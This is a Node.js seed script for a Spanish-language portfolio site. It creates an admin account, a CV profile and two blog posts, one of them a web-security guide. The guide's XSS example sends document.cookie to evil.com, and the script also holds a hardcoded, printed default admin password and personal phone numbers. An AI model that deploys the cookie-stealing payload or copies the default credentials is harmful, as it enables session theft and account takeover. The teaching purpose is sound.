import dotenv from 'dotenv';
import mongoose from 'mongoose';
import Profile from './models/Profile.js';
import User from './models/User.js';
import BlogPost from './models/BlogPost.js';

dotenv.config();

const connectDB = async () => {
  try {
    await mongoose.connect(process.env.MONGODB_URI);
    console.log('MongoDB conectado');
  } catch (error) {
    console.error(`Error: ${error.message}`);
    process.exit(1);
  }
};

const seedData = async () => {
  try {
    await connectDB();

    // Limpiar datos existentes
    await Profile.deleteMany();
    await User.deleteMany();
    await BlogPost.deleteMany();

    console.log('✅ Datos anteriores eliminados');

    // Crear usuario administrador
    const admin = await User.create({
      email: process.env.ADMIN_EMAIL || 'dennysvela@hotmail.com',
      password: process.env.ADMIN_PASSWORD || 'Admin123!',
      role: 'admin'
    });

    console.log('✅ Usuario administrador creado');

    // Crear perfil basado en tu CV
    const profile = await Profile.create({
      nombre: 'Dennys Vela',
      titulo: 'Desarrollador Full Stack',
      descripcion: 'Soy una persona amigable, confiable y comprometida con el aprendizaje continuo. Me apasiona la tecnología, especialmente la física, la robótica y el desarrollo de software. Busco adquirir experiencia en cada proyecto que emprendo, valorando el crecimiento personal y profesional.',
      foto: 'https://via.placeholder.com/300',
      contacto: {
        telefono: '0999465255',
        email: 'dennysvela@hotmail.com',
        direccion: 'Ciudad Bicentenario, Quito, Ecuador',
        linkedin: 'https://linkedin.com/in/dennys-vela',
        github: 'https://github.com/dennysvela'
      },
      
      educacion: [
        {
          institucion: 'Pontificia Universidad Católica del Ecuador – PUCETEC',
          titulo: 'Tecnología en Desarrollo de Software',
          periodo: '2024 – 2026',
          estado: 'en_curso',
          descripcion: 'Estudiante de tecnología enfocado en desarrollo web full-stack'
        },
        {
          institucion: 'Universidad de las Fuerzas Armadas',
          titulo: 'Ingeniería en Mecatrónica',
          periodo: '2023 – 2024',
          estado: 'no_concluido',
          descripcion: 'Estudios en ingeniería mecatrónica'
        },
        {
          institucion: 'Unidad Educativa Alvernia',
          titulo: 'Bachillerato en Ciencias',
          periodo: '2011 – 2021',
          estado: 'completado',
          descripcion: 'Educación secundaria con énfasis en ciencias'
        }
      ],
      
      habilidades: {
        lenguajes: ['Python', 'JavaScript', 'HTML', 'CSS', 'SQL'],
        frameworks: ['Django', 'React', 'Express.js', 'Tailwind CSS'],
        bases_datos: ['PostgreSQL', 'MongoDB', 'SQL Server'],
        herramientas: ['Git', 'Linux', 'Vite', 'Node.js'],
        otros: ['RESTful APIs', 'Responsive Design', 'Seguridad Web']
      },
      
      proyectos: [
        {
          nombre: 'MoreSabores',
          descripcion: 'Desarrollo de página web como parte del proyecto de vinculación comunitaria, aplicando buenas prácticas de diseño, seguridad y despliegue en Django.',
          tecnologias: ['Django', 'Python', 'PostgreSQL', 'HTML', 'CSS', 'JavaScript'],
          url: 'https://moresabores.example.com',
          destacado: true
        }
      ],
      
      cursos: [
        {
          nombre: 'Curso de Inglés B1',
          institucion: 'Instituto Oxford',
          periodo: '2018 – 2021',
          descripcion: 'Nivel intermedio de inglés'
        }
      ],
      
      idiomas: [
        {
          idioma: 'Español',
          nivel: 100
        },
        {
          idioma: 'Inglés',
          nivel: 50
        }
      ],
      
      referencias: [
        {
          nombre: 'Francis Cabezas',
          telefono: '098742984'
        },
        {
          nombre: 'Steven Valladolid',
          telefono: '0992301511'
        }
      ]
    });

    console.log('✅ Perfil creado con éxito');

    // Crear 2 posts de ejemplo
    const posts = [
      {
        titulo: 'Introducción al Desarrollo Full Stack con MERN',
        resumen: 'Una guía completa sobre el stack MERN (MongoDB, Express, React, Node.js) y cómo empezar a desarrollar aplicaciones web modernas.',
        contenido: `# Introducción al Desarrollo Full Stack con MERN

El stack MERN se ha convertido en una de las opciones más populares para el desarrollo web full stack. En este artículo, exploraremos cada componente y cómo trabajan juntos para crear aplicaciones web robustas y escalables.

## ¿Qué es MERN?

MERN es un acrónimo que representa cuatro tecnologías clave:

- **M**ongoDB: Base de datos NoSQL
- **E**xpress.js: Framework web para Node.js
- **R**eact: Biblioteca de JavaScript para interfaces de usuario
- **N**ode.js: Entorno de ejecución de JavaScript

## MongoDB: La Base de Datos

MongoDB es una base de datos NoSQL orientada a documentos. A diferencia de las bases de datos relacionales tradicionales, MongoDB almacena datos en documentos JSON flexibles, lo que facilita el modelado de datos complejos.

\`\`\`javascript
// Ejemplo de documento en MongoDB
{
  "_id": ObjectId("5f8d0d55b54764421b7156f1"),
  "nombre": "Dennys Vela",
  "email": "dennysvela@hotmail.com",
  "proyectos": [
    { "nombre": "Portafolio", "tecnologias": ["React", "Node.js"] }
  ]
}
\`\`\`

## Express.js: El Backend

Express.js es un framework minimalista para Node.js que facilita la creación de APIs RESTful y aplicaciones web. Su simplicidad y flexibilidad lo hacen ideal para proyectos de cualquier tamaño.

\`\`\`javascript
import express from 'express';
const app = express();

app.get('/api/users', (req, res) => {
  res.json({ message: 'Lista de usuarios' });
});

app.listen(5000, () => {
  console.log('Servidor corriendo en puerto 5000');
});
\`\`\`

## React: El Frontend

React revolucionó el desarrollo frontend con su enfoque de componentes reutilizables y el Virtual DOM. Permite crear interfaces de usuario dinámicas y eficientes.

\`\`\`jsx
function UserProfile({ user }) {
  return (
    <div className="profile">
      <h2>{user.nombre}</h2>
      <p>{user.email}</p>
    </div>
  );
}
\`\`\`

## Node.js: El Entorno de Ejecución

Node.js permite ejecutar JavaScript en el servidor, unificando el lenguaje de programación tanto en frontend como en backend. Esto facilita el desarrollo y reduce la curva de aprendizaje.

## Ventajas del Stack MERN

1. **JavaScript en todo el stack**: Un solo lenguaje para frontend y backend
2. **JSON en todas partes**: Formato común de datos
3. **Escalabilidad**: MongoDB y Node.js son altamente escalables
4. **Comunidad activa**: Gran cantidad de recursos y soporte
5. **Desarrollo rápido**: Componentes reutilizables y herramientas modernas

## Conclusión

El stack MERN ofrece una solución completa y moderna para el desarrollo web. Su popularidad continúa creciendo gracias a su eficiencia, flexibilidad y la gran comunidad que lo respalda. Si estás comenzando en el desarrollo full stack, MERN es una excelente opción para aprender y construir proyectos profesionales.`,
        categoria: 'fullstack',
        etiquetas: ['MERN', 'JavaScript', 'Full Stack', 'MongoDB', 'React'],
        publicado: true,
        imagen: 'https://images.unsplash.com/photo-1633356122544-f134324a6cee?w=800'
      },
      {
        titulo: 'Seguridad en Aplicaciones Web: Guía Práctica',
        resumen: 'Aprende las mejores prácticas de seguridad para proteger tus aplicaciones web contra ataques comunes como XSS, CSRF e inyecciones SQL.',
        contenido: `# Seguridad en Aplicaciones Web: Guía Práctica

La seguridad web es un aspecto crítico que todo desarrollador debe dominar. En este artículo, exploraremos las vulnerabilidades más comunes y cómo protegerse contra ellas.

## Vulnerabilidades Comunes

### 1. Cross-Site Scripting (XSS)

XSS ocurre cuando un atacante inyecta código JavaScript malicioso en tu sitio web. Esto puede permitirle robar cookies, tokens de sesión o redirigir a los usuarios a sitios maliciosos.

**Ejemplo de ataque:**
\`\`\`html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
\`\`\`

**Protección:**
\`\`\`javascript
// Escapar HTML antes de renderizar
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
\`\`\`

### 2. Inyección SQL

Las inyecciones SQL permiten a los atacantes manipular consultas a la base de datos, potencialmente obteniendo acceso a datos sensibles.

**Ejemplo vulnerable:**
\`\`\`javascript
// ❌ NUNCA HAGAS ESTO
const query = \`SELECT * FROM users WHERE email = '\${userInput}'\`;
\`\`\`

**Protección con Mongoose:**
\`\`\`javascript
// ✅ Usar consultas parametrizadas
const user = await User.findOne({ email: userInput });
\`\`\`

### 3. Cross-Site Request Forgery (CSRF)

CSRF engaña al navegador del usuario para que realice acciones no autorizadas en un sitio donde está autenticado.

**Protección:**
\`\`\`javascript
import csrf from 'csurf';
const csrfProtection = csrf({ cookie: true });

app.post('/api/transfer', csrfProtection, (req, res) => {
  // Procesar transferencia
});
\`\`\`

## Mejores Prácticas de Seguridad

### 1. Helmet.js para Headers de Seguridad

\`\`\`javascript
import helmet from 'helmet';
app.use(helmet());
\`\`\`

### 2. Rate Limiting

\`\`\`javascript
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 100 // máximo 100 peticiones
});

app.use('/api/', limiter);
\`\`\`

### 3. Validación de Entrada

\`\`\`javascript
import { body, validationResult } from 'express-validator';

app.post('/api/user',
  body('email').isEmail(),
  body('password').isLength({ min: 6 }),
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    // Procesar solicitud
  }
);
\`\`\`

### 4. Almacenamiento Seguro de Contraseñas

\`\`\`javascript
import bcrypt from 'bcryptjs';

// Hashear contraseña
const salt = await bcrypt.genSalt(10);
const hashedPassword = await bcrypt.hash(password, salt);

// Verificar contraseña
const isMatch = await bcrypt.compare(inputPassword, hashedPassword);
\`\`\`

### 5. HTTPS y Configuración Segura de Cookies

\`\`\`javascript
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    secure: true, // Solo HTTPS
    httpOnly: true, // No accesible desde JavaScript
    sameSite: 'strict', // Protección CSRF
    maxAge: 3600000 // 1 hora
  }
}));
\`\`\`

## Checklist de Seguridad

- ✅ Usar HTTPS en producción
- ✅ Validar toda entrada de usuario
- ✅ Implementar rate limiting
- ✅ Usar headers de seguridad (Helmet)
- ✅ Proteger contra XSS
- ✅ Hashear contraseñas con bcrypt
- ✅ Implementar autenticación JWT segura
- ✅ Configurar CORS correctamente
- ✅ Mantener dependencias actualizadas
- ✅ Usar variables de entorno para secretos

## Conclusión

La seguridad web no es opcional; es fundamental. Implementar estas prácticas desde el inicio del proyecto te ahorrará muchos problemas futuros. Recuerda que la seguridad es un proceso continuo, no un estado final. Mantente actualizado con las últimas amenazas y mejores prácticas de la industria.`,
        categoria: 'seguridad',
        etiquetas: ['Seguridad', 'XSS', 'SQL Injection', 'CSRF', 'Helmet'],
        publicado: true,
        imagen: 'https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?w=800'
      }
    ];

    await BlogPost.insertMany(posts);

    console.log('✅ Posts de blog creados');
    console.log('\n========================================');
    console.log('✅ Base de datos inicializada con éxito');
    console.log('========================================');
    console.log(`Email Admin: ${admin.email}`);
    console.log('Password Admin: Admin123!');
    console.log('========================================\n');

    process.exit(0);
  } catch (error) {
    console.error(`❌ Error: ${error.message}`);
    process.exit(1);
  }
};

seedData();
